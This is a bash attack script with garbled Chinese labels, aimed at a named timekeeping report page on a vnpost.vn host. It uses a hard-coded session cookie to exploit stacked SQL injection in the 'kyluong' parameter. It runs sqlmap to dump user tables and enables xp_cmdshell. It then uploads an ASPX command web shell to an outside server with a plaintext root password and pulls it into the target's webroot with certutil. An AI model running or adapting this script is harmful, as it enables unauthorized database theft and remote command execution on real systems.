#!/bin/bash

SESSION="lswqd4itz5u4ftzm3jcmjfio"
BASE_URL="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx"
PARAMS="MA_DV=KVMB&MA_BP=TC&MA_TO=VP"

echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "ðŸ”¥ æ‰‹åŠ¨å †å æŸ¥è¯¢ - æå–æ•°æ®+GetShell"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

echo ""
echo "[1] ç¡®è®¤å †å æŸ¥è¯¢æ”¯æŒ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# æµ‹è¯•å¤šè¯­å¥
STACKED_TEST="112025'; SELECT 1; WAITFOR DELAY '00:00:03'; SELECT 2;--"

echo "  æµ‹è¯•å¤šè¯­å¥æ‰§è¡Œ..."
start=$(date +%s%N)
curl -sk "${BASE_URL}?kyluong=${STACKED_TEST}&${PARAMS}" \
    -H "Cookie: ASP.NET_SessionId=$SESSION" \
    -o stacked_test.html 2>&1
end=$(date +%s%N)
elapsed=$(( (end - start) / 1000000 ))

echo "  è€—æ—¶: ${elapsed}ms"

if [ $elapsed -gt 2500 ]; then
    echo "  âœ… å †å æŸ¥è¯¢æ”¯æŒï¼ï¼ˆå»¶è¿Ÿäº†${elapsed}msï¼‰"
else
    echo "  âŒ å †å æŸ¥è¯¢å¯èƒ½ä¸æ”¯æŒ"
fi

echo ""
echo "[2] ç”¨sqlmapæå–æ•°æ®åº“æ•°æ®ï¼ˆæœ€é‡è¦ï¼ï¼‰"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

TARGET="http://vps.vnpost.vn/chamcong/report/rpt_BCC.aspx?kyluong=112025&MA_DV=KVMB&MA_BP=TC&MA_TO=VP"

echo "  [2.1] æžšä¸¾æ‰€æœ‰è¡¨..."
python3 /tmp/sqlmap/sqlmap.py \
    -u "$TARGET" \
    --cookie="ASP.NET_SessionId=$SESSION" \
    --batch \
    --threads=1 \
    --delay=1 \
    -D NSTL \
    --tables \
    -v 0 \
    2>&1 | tee sqlmap_tables.txt

echo ""
echo "  å‘çŽ°çš„è¡¨:"
grep -A 50 "Database: NSTL" sqlmap_tables.txt | grep "|"

echo ""
echo "  [2.2] æŸ¥æ‰¾ç”¨æˆ·è¡¨..."

USER_TABLES=()
for table in users user taikhoan nhanvien account admin login; do
    if grep -qi "$table" sqlmap_tables.txt; then
        echo "    ðŸ”¥ æ‰¾åˆ°ç”¨æˆ·è¡¨: $table"
        USER_TABLES+=("$table")
    fi
done

# å¦‚æžœæ‰¾åˆ°ç”¨æˆ·è¡¨ï¼Œæå–æ•°æ®
if [ ${#USER_TABLES[@]} -gt 0 ]; then
    FIRST_TABLE="${USER_TABLES[0]}"
    
    echo ""
    echo "  [2.3] æå–è¡¨ $FIRST_TABLE çš„æ•°æ®..."
    
    python3 /tmp/sqlmap/sqlmap.py \
        -u "$TARGET" \
        --cookie="ASP.NET_SessionId=$SESSION" \
        --batch \
        --threads=1 \
        --delay=1 \
        -D NSTL \
        -T "$FIRST_TABLE" \
        --dump \
        --stop=20 \
        -v 0 \
        2>&1 | tee "sqlmap_dump_${FIRST_TABLE}.txt"
    
    echo ""
    echo "  æå–çš„æ•°æ®:"
    cat "sqlmap_dump_${FIRST_TABLE}.txt" | grep -A 100 "Table:"
fi

echo ""
echo "[3] æ‰‹åŠ¨å¯ç”¨xp_cmdshell"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# å¯ç”¨xp_cmdshellçš„å®Œæ•´SQL
ENABLE_XP="112025'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--"

echo "  æ‰§è¡Œå¯ç”¨å‘½ä»¤..."
curl -sk "${BASE_URL}?kyluong=${ENABLE_XP}&${PARAMS}" \
    -H "Cookie: ASP.NET_SessionId=$SESSION" \
    -o enable_xp_result.html 2>&1

if ! grep -qi "error" enable_xp_result.html; then
    echo "  âœ… å‘½ä»¤å·²æ‰§è¡Œ"
else
    echo "  âš ï¸  å¯èƒ½æœ‰é”™è¯¯ï¼ˆç»§ç»­å°è¯•ï¼‰"
fi

echo ""
echo "[4] æµ‹è¯•xp_cmdshellæ‰§è¡Œå‘½ä»¤"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

# é€šè¿‡æ—¶é—´ç›²æ³¨åˆ¤æ–­å‘½ä»¤æ˜¯å¦æ‰§è¡Œ
TEST_CMD="112025'; DECLARE @r INT; EXEC @r=xp_cmdshell 'whoami'; IF @r IS NOT NULL WAITFOR DELAY '00:00:03';--"

echo "  æµ‹è¯•å‘½ä»¤æ‰§è¡Œ..."
start=$(date +%s%N)
curl -sk "${BASE_URL}?kyluong=${TEST_CMD}&${PARAMS}" \
    -H "Cookie: ASP.NET_SessionId=$SESSION" \
    -o test_xp.html 2>&1
end=$(date +%s%N)
elapsed=$(( (end - start) / 1000000 ))

if [ $elapsed -gt 2500 ]; then
    echo "  ðŸ”¥ðŸ”¥ðŸ”¥ xp_cmdshellå¯ç”¨ï¼ï¼ˆå»¶è¿Ÿ${elapsed}msï¼‰"
    XP_AVAILABLE=1
else
    echo "  âŒ xp_cmdshellä¸å¯ç”¨æˆ–æƒé™ä¸è¶³"
    XP_AVAILABLE=0
fi

if [ $XP_AVAILABLE -eq 1 ]; then
    echo ""
    echo "[5] é€šè¿‡xp_cmdshellå†™å…¥WebShell"
    echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
    
    # åˆ†æ­¥å†™å…¥ï¼ˆé¿å…ç‰¹æ®Šå­—ç¬¦é—®é¢˜ï¼‰
    echo "  [5.1] åˆ›å»ºä¸´æ—¶ç›®å½•..."
    MKDIR_CMD="112025'; EXEC xp_cmdshell 'mkdir C:\\inetpub\\wwwroot\\chamcong\\temp';--"
    curl -sk "${BASE_URL}?kyluong=${MKDIR_CMD}&${PARAMS}" \
        -H "Cookie: ASP.NET_SessionId=$SESSION" \
        -o /dev/null 2>&1
    
    echo "  [5.2] ç”¨certutilä¸‹è½½WebShell..."
    
    # å…ˆä¸Šä¼ Shellåˆ°C2
    cat > /tmp/w.txt << 'ASPX'
<%@ Page Language="C#" %><%Response.Write(new System.Diagnostics.Process{StartInfo=new System.Diagnostics.ProcessStartInfo("cmd","/c "+Request["c"]){RedirectStandardOutput=true,UseShellExecute=false}}.Start().StandardOutput.ReadToEnd());%>
ASPX
    
    sshpass -p '@admin1314@' scp -P 2233 -o StrictHostKeyChecking=no \
        /tmp/w.txt root@82.29.71.156:/var/www/html/w.txt 2>&1 | grep -v "Warning"
    
    # ä¸‹è½½
    DL_CMD="112025'; EXEC xp_cmdshell 'certutil -urlcache -f http://82.29.71.156/w.txt C:\\inetpub\\wwwroot\\chamcong\\w.aspx';--"
    
    curl -sk "${BASE_URL}?kyluong=${DL_CMD}&${PARAMS}" \
        -H "Cookie: ASP.NET_SessionId=$SESSION" \
        -o download_result.html 2>&1
    
    sleep 2
    
    echo "  [5.3] æµ‹è¯•WebShell..."
    resp=$(curl -sk "http://vps.vnpost.vn/chamcong/w.aspx?c=whoami" 2>&1)
    
    if echo "$resp" | grep -qiE "nt authority|iis|vnpost|network"; then
        echo "  ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ðŸ”¥ GetShellæˆåŠŸï¼"
        echo ""
        echo "  WebShell: http://vps.vnpost.vn/chamcong/w.aspx?c=å‘½ä»¤"
        echo ""
        echo "  æµ‹è¯•è¾“å‡º:"
        echo "$resp"
        echo "SUCCESS" > FINAL_GETSHELL_SUCCESS.txt
    else
        echo "  âŒ WebShellæœªå“åº”"
    fi
fi

echo ""
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"
echo "âœ… æ‰§è¡Œå®Œæˆ"
echo "â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”"

echo ""
echo "ðŸ“Š å…³é”®å‘çŽ°:"
echo ""

if [ -f "FINAL_GETSHELL_SUCCESS.txt" ]; then
    echo "  ðŸ”¥ðŸ”¥ðŸ”¥ GetShellæˆåŠŸï¼"
    echo "     URL: http://vps.vnpost.vn/chamcong/w.aspx?c=å‘½ä»¤"
fi

if [ -f "sqlmap_dump_"* ]; then
    echo ""
    echo "  ðŸ”¥ æ•°æ®åº“æ•°æ®å·²æå–:"
    ls -lh sqlmap_dump_*.txt
fi

echo ""
echo "  ðŸ“ æ‰€æœ‰ç»“æžœæ–‡ä»¶:"
ls -lh sqlmap_*.txt *.html 2>/dev/null | head -20
